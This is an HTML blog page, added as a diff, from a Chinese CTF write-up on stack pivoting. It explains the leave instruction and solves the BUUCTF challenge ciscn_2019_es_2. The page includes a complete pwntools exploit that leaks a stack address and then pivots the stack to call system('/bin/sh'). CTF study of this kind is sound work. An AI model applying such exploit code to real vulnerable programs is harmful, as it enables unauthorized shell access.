@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mr.BW">
+
+
+
+
+
+<title>栈迁移 | Mr.BW的妙妙屋</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/../fonts/iconfont3/iconfont.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+        
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mr.BW&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mr.BW&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">回到底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部收起"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">栈迁移</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mr.BW</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">七月 24, 2024&nbsp;&nbsp;10:46:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/ctf/">ctf</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="栈迁移简介"><a href="#栈迁移简介" class="headerlink" title="栈迁移简介"></a>栈迁移简介</h1><p>当程序输入不足以构造rop链，但是又能覆盖rbp（ebp）就可以考虑栈迁移，让程序换个地方执行rop链</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="leave指令"><a href="#leave指令" class="headerlink" title="leave指令"></a>leave指令</h2><p>leave 相当于</p>
+<ol>
+<li>mov esp ebp</li>
+<li>pop ebp</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 栈初始状态</span><br><span class="line">0x0001 esp</span><br><span class="line">0x0002 </span><br><span class="line">0x0003 ebp</span><br><span class="line">0x0004 return addr</span><br><span class="line">0x0005</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2. 执行 mov esp ebp</span><br><span class="line">0x0001</span><br><span class="line">0x0002</span><br><span class="line">0x0003 esp ebp</span><br><span class="line">0x0004 return addr</span><br><span class="line">0x0005</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">3. 执行 pop ebp</span><br><span class="line">0x0001</span><br><span class="line">0x0002</span><br><span class="line">0x0003 </span><br><span class="line">0x0004 esp return addr      ebp此时为之前0x0003里的值</span><br><span class="line">0x0005</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><p>填充完buf后，覆盖ebp，让ebp处的值位新的地址</p>
+<p>在0x0003的位置填上所要跳转的地址，再次执行leave，则程序就会跳转到目标地址</p>
+<p>注意栈迁移时第一次的return addr为下一次leave的地址</p>
+<p>跳转完成后，新地址的下一处地址即为esp的位置</p>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>题目来源：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">BUUCTF在线评测 (buuoj.cn)</a> ciscn_2019_es_2</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>main函数没什么好看的，初始化后就来到了这里</p>
+<p><img src="/../image/%E6%A0%88%E8%BF%81%E7%A7%BB/1.png" alt="1"></p>
+<p>程序有两次read，显然0x30的长度不足以构造rop链，因此可以考虑栈迁移</p>
+<p>首先第一个read把s填满后让printf读，只要没有\x00，printf就会一直读下去，因此可以让printf读出ebp泄露栈地址</p>
+<p>第二个read就可以考虑栈迁移了，这里把ROP写到s中，也就是栈上，栈迁移后程序继续在栈上执行</p>
+<p>第二次的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=p32(1)+p32(0x8048400)+p32(0)+p32(addr-0x18)+b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload=payload.ljust(0x28,b&#x27;a&#x27;)</span><br><span class="line">payload+=p32(addr-0x28)+p32(leave)</span><br></pre></td></tr></table></figure>
+
+<p>首先p32(1)是填充垃圾数据，让esp跳转到这里之后pop ebp让esp指向第二个p32()也就是system</p>
+<p>p(0)是因为32位下system和参数间要填充四个字节</p>
+<p>后面的addr-0x18是为了构造指向binsh的指针，因为system的参数要是指针才可以</p>
+<p>之后填充s，覆盖ebp让ebp的地址为s里，后面返回地址为下一个leave ret处</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;node5.buuoj.cn&#x27;,28904)</span></span><br><span class="line"></span><br><span class="line">leave=<span class="number">0x8048562</span></span><br><span class="line">system=<span class="number">0x8048400</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">payload=<span class="number">0x27</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;p&#x27;</span></span><br><span class="line">r.send(payload)<span class="comment">#1</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">addr=addr-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">payload=p32(<span class="number">1</span>)+p32(<span class="number">0x8048400</span>)+p32(<span class="number">0</span>)+p32(addr-<span class="number">0x18</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p32(addr-<span class="number">0x28</span>)+p32(leave)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">r.sendline(payload)<span class="comment">#2</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        <a href="/tags/%E5%AD%A6%E4%B9%A0/"># 学习</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/07/22/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E5%B9%B6%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8-n%E4%BF%AE%E6%94%B9%E5%9C%B0%E5%9D%80%E7%9A%84%E4%B8%AD%E9%97%B4%E5%80%BC/">非栈上格式化字符串，并如何利用%n修改地址的中间值</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mr.BW | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+
+</html>
